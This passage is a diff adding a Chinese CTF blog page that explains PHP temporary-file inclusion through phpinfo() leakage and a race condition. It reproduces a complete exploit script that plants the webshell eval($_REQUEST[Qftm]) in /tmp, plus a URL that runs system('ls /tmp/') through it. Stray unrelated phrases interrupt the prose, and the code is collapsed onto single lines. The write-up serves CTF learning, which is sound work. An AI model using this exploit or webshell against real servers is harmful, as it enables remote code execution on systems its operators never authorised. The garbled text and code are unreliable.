@@ -1,0 +1,999 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>临时文件包含 - Yu9991n9的博客</title>
+
+  
+    <meta name="description" content="原理假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务器存储我们恶意生成的临时文件，该临时文件包含我们构造的恶意代码，此时服务器就存在我们可以包含的文件。 目前，常见的两种临时文件包含漏洞利用方式是： PHPINFO（） and PHP7 Sement Fault,利用这两种奇淫技巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="临时文件包含">
+<meta property="og:url" content="https://yu9991n9.github.io/2026/07/04/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+<meta property="og:site_name" content="Yu9991n9的博客">
+<meta property="og:description" content="原理假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务器存储我们恶意生成的临时文件，该临时文件包含我们构造的恶意代码，此时服务器就存在我们可以包含的文件。 目前，常见的两种临时文件包含漏洞利用方式是： PHPINFO（） and PHP7 Sement Fault,利用这两种奇淫技巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+<meta property="article:published_time" content="2026-07-04T14:07:58.000Z">
+<meta property="article:modified_time" content="2026-08-21T04:02:21.070Z">
+<meta property="article:author" content="Yu9991n9">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-07-04T22:07:58+08:00","dateModified":"2026-08-21T12:02:21+08:00","datePublished":"2026-07-04T22:07:58+08:00","description":"","headline":"临时文件包含","mainEntityOfPage":{"@type":"WebPage","@id":"https://yu9991n9.github.io/2026/07/04/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},"publisher":{"@type":"Organization","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://yu9991n9.github.io/2026/07/04/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/18/%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E7%9A%84%E8%AE%B0%E5%BD%95/"><span class="title">部分刷题的记录</span></a><a class="item title" href="/2026/07/04/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">临时文件包含</span></a><a class="item title" href="/2026/07/03/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"><span class="title">无列名注入</span></a><a class="item title" href="/2026/05/13/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><span class="title">渗透之信息搜集</span></a><a class="item title" href="/2026/08/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%83%A8%E5%88%86%E9%93%BE%E5%AD%90%EF%BC%88URLDNS,CC1,CC6)/"><span class="title">Java反序列化的部分链子（URLDNS、CC1、CC6）</span></a><a class="item title" href="/2026/06/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">Java安全漫谈学习笔记</span></a><a class="item title" href="/2026/06/24/java%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E5%8F%8D%E5%B0%84/"><span class="title">Java安全前置：反射</span></a><a class="item title" href="/2026/07/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"><span class="title">宽字节注入</span></a><a class="item title" href="/2026/03/12/%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-wakeup/"><span class="title">各版本绕过_wakeup()</span></a><a class="item title" href="/2026/03/08/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">session 文件包含</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/ctf/">CTF</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-07-04T14:07:58.000Z">2026-07-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-08-21T04:02:21.070Z">2026-08-21</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>临时文件包含</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务器存储我们恶意生成的临时文件，该临时文件包含我们构造的恶意代码，此时服务器就存在我们可以包含的文件。</p>
+<p>目前，常见的两种临时文件包含漏洞利用方式是： PHPINFO（） and PHP7 Sement Fault,利用这两种奇淫技巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果，也就是拿到服务器权限进行后续操作。</p>
+<p>以下是php临时文件的机制：</p>
+<p><img src="/images/ctf/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20260306231554019.png" alt="image-20260306231554019"></p>
+<p>$_FILE 超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_d_tmp_dir 指定，默认是/tmp目录。$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</span><br></pre></td></tr></table></figure>
+
+<p>在临时文件包含漏洞中$_FILES[‘userfile’][‘name’]这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
+<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>文件被上传之后，默认会存储到服务端的默认临时目录中，该临时目录由PHP.ini 的UPload_tmp_dir 属性指定，假如 upload_tmp_dir 的路径不可写，PHP 会上传到系统默认的临时目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux目录：Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。/tmp/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/b870054104f182e4176ff5e197763916.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows 目录：Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。C:/Windows/ C:/Windows/Temp/</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命名规则："><a href="#命名规则：" class="headerlink" title="命名规则："></a>命名规则：</h3><p>存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们需要知道它的命令规则是什么。</p>
+<p>防病毒程序与恶意软件</p>
+<p>可以通过PHPINFO 查看临时文件的信息。<br>Linux Temporary File<br>Linux 临时文件主要存储在 &#x2F;tmp&#x2F; 目录下，格式通常是（ &#x2F;tmp&#x2F;php【6个随机字符】）<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/b9d8c814471e08bc12e0a977a48b8f60.png" alt="image.png"></p>
+<p>Windows Temporary File<br>Windows 临时文件主要存储在 C:&#x2F;Windows&#x2F;目录下，格式通常是（C:&#x2F;Windows&#x2F;php[4个随机字符].tmp）<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/3adb6dbd874c632c25bd74222d0e788a.png" alt="image.png"></p>
+<h1 id="0x02：PHPINFO"><a href="#0x02：PHPINFO" class="headerlink" title="0x02：PHPINFO():"></a>0x02：PHPINFO():</h1><p>通过上面的介绍，服务器上存储的临时文件时随机的，这就很难获取真实的文件名，不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。<br>index.php</p>
+<p>黑客与破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    $file  = $_GET[&#x27;file&#x27;];      include($file);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存未一个临时文件。文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。</p>
+<h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><ul>
+<li>利用条件无 PHPINFO的这种特性源于php自身，与php的版本无关</li>
+<li>脚本语言</li>
+</ul>
+<p>测试脚本：<br>探测是否存在 PHPINFO 包含临时文件信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">files = &#123;  &#x27;file&#x27;: (&quot;aa.txt&quot;,&quot;ssss&quot;)&#125;url = &quot;http://x.x.x.x/phpinfo.php&quot;</span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以看到回显中有如下内容<br>Linux<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/ba070ff294c04e5fa1a4193696df7052.png" alt="image.png"><br>Windows<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/0c067bedd984699649ba0633f9373f58.png" alt="image.png"></p>
+<h3 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h3><p>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</p>
+<p>计算机服务器</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<h3 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h3><p>这个时候就需要用到条件竞争，具体原理和过程如下：</p>
+<p>(1) 发送包含了webshell 的上传数据包给phpinfo页面，这个数据包的header、 get 等位置需要塞满垃圾数据。<br>(2) 因为 phpinfo 页面会将所有的数据都打印出来，1中的数据会将整个 phpinfio 页面撑的非常大。<br>(3) php 默认的输出缓冲区为4096，可以理解为 php 每次返回 4096 个字节给socket 连接。<br>(4) 所以，我们直接操作原生的 socket ，每次读取4096个字节.只要读取到的字符里包含临时文件名，就立即发送第二个数据包。<br>(5) 此时，第一个数据包的 socket 连接实际上还没有结束，因为 php 还在继续每次输出4096个字节，所以临时文件还没有删除。<br>(6) 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即成功包含临时文件，最终getshell。<br>（参考ph牛<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89">https://github.com/vulhub/vulhub/tree/master/php/inclusion）</a><br>**<br><strong>Getshell</strong><br><strong>exp.py</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python#python version 2.7import sysimport threadingimport socketdef setup(host, port):    TAG = &quot;Security Test&quot;    PAYLOAD = &quot;&quot;&quot;%s\r&lt;?php file_put_contents(&#x27;/tmp/Qftm&#x27;, &#x27;&lt;?php eval($_REQUEST[Qftm])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot; % TAG    # PAYLOAD = &quot;&quot;&quot;%s\r    # &lt;?php file_put_contents(&#x27;/var/www/html/Qftm.php&#x27;, &#x27;&lt;?php eval($_REQUEST[Qftm])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA = &quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding = &quot;A&quot; * 5000    REQ1 = &quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot; + padding + &quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; % (len(REQ1_DATA), host, REQ1_DATA)    # modify this to suit the LFI script    LFIREQ = &quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.index(&quot;[tmp_name] =&gt; &quot;)        fn = d[i + 17:i + 31]    except ValueError:        return None    s2.send(lfireq % (fn, host))    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter = 0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock = l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter += 1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                if x:                    print &quot;\nGot it! Shell created in /tmp/Qftm.php&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d += i        if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i + 10], i)    # padded up a bit    return i + 256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port = 80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz = 10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,    reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0, poolsz):        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write(&quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#x27; down...&quot;    for t in tp:        t.join()if __name__ == &quot;__main__&quot;:    main()</span><br></pre></td></tr></table></figure>
+
+<p>包含生成&#x2F;tmp&#x2F;Qftm后门文件<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/3f1f5dad5c1b6803644939af4b2d9749.png" alt="image.png"><br>拿到RCE之后，可以查看tmp下生成的后门文件<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/f73932bd9ece6bd2429a8547fb56895d.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.33.6.145/index.php?file=/tmp/Qftm&amp;Qftm=system(%27ls%20/tmp/%27)</span><br></pre></td></tr></table></figure>
+
+<p>然后使用后门管理工具连接后门webshell<br><img src="https://geekdaxue.co/uploads/projects/avenue-le@bmhg6h/3efc6a8dfda82f45664cac5b1d662544.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/Qftm &lt;?php eval($_REQUEST[Qftm])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>包含上传文件</strong><br><strong>利用条件</strong>：千变万化，不过至少得知道上传的文件在哪，叫什么名字！！！</p>
+<p>很重要的一点就是用条件竞争去写马</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>有时我们在面对在服务器上找不到我们可以包含的文件时 我们可以尝试一下让服务器储存我们恶意生成的临时文件 该临时文件包含我们构造的恶意代码 此时服务器就存在我们可以包含的文件</p>
+<p>目前常见的两种临时文件包含漏洞的主要利用方式是:PHPINFO()和PHP7 Segment Fault</p>
+<p>利用这两种方法可以向服务器上传文件同时在服务器上生成恶意的临时文件 然后将恶意的临时文件包含就可以达到任意代码执行的效果</p>
+<h2 id="临时文件是什么"><a href="#临时文件是什么" class="headerlink" title="临时文件是什么"></a>临时文件是什么</h2><p>我们在php中上传的文件会保存到全局变量$__FILES里面 它是一个二维数组 里面储存了我们上传文件的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端存储的临时文件名</span><br></pre></td></tr></table></figure>
+
+<p>这里很重要的是我们要知道name这个变量的值 因为临时文件的名字都是由随机函数生成的 只有知道文件的名字才能正确的去包含它</p>
+<h2 id="存储目录"><a href="#存储目录" class="headerlink" title="存储目录"></a>存储目录</h2><p>文件被上传后默认会被存储到服务器端的默认临时目录 该临时目录由php.ini的upload_tmp_dir属性指定 假如upload_tmp_dir的路径不可写 php就会上传到系统默认的临时文件目录里面去</p>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>linux系统的临时文件主要存储在根目录的&#x2F;tmp文件下 </p>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>windows系统服务的临时文件主要存储在系统盘的windows文件夹下 具有一定的开放权限</p>
+<p>C:&#x2F;Windows&#x2F; </p>
+<p>C:&#x2F;Windows&#x2F;<strong>Temp</strong>&#x2F;</p>
+<h2 id="临时文件命名规则"><a href="#临时文件命名规则" class="headerlink" title="临时文件命名规则"></a>临时文件命名规则</h2><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><p>linux的临时文件通查储存在&#x2F;tmp&#x2F;目录下 格式通常是：&#x2F;tmp&#x2F;php六个随机字符</p>
+<p><img src="/images/ctf/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20260704212045027.png" alt="image-20260704212045027"></p>
+<h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><p>windows的临时文件主要储存到<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<p><img src="https://p0.ssl.qhimg.com/t01b4d0f072cf1b60e9.png" alt="img"></p>
+<h1 id="PHPINFO特性"><a href="#PHPINFO特性" class="headerlink" title="PHPINFO特性"></a>PHPINFO特性</h1><p>在php当中 我们只要向服务器上的任意一个文件发送了带有文件数据的POST请求  那么php在执行这个页面的代码之前就会把这个文件接收下来 斌临时保存在系统的临时目录下 同时会把这个文件的信息存储到$__FILES这个数组里面</p>
+<p>php的清理机制是一旦当前这个php及哦啊本运行结束 系统就会立刻删除刚刚的那个临时文件 所以我们直接来做的话既要想办法搞到临时文件的名字 还要去到有文件包含漏洞的页面去包含 我们第一步光找名字就够得找了</p>
+<p>这时我们可以利用phpinfo这个页面根据它返回的变量信息去得到我们临时文件的名字 但是当phpinfo这&#x3D;这个页面执行完之后这个临时文件也会被删除 那我们这里就要写一个条件竞争的脚本了</p>
+<p>1.我们发送包含了恶意代码的数据包给phpinfo界面 这个数据包我们想办法把它塞得尽可能的大 这样处理它时就需要更多的时间 这样也为我们后续的条件竞争尽可能的创造条件 我们要在这个数据包的header get等位置塞满大量的垃圾数据</p>
+<p>2.然后我们写好了的脚本这个时候就会读取phpinfo界面返回的临时文件信息 并且去到文件包含的界面疯狂请求 造成文件包含</p>
+<p>利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 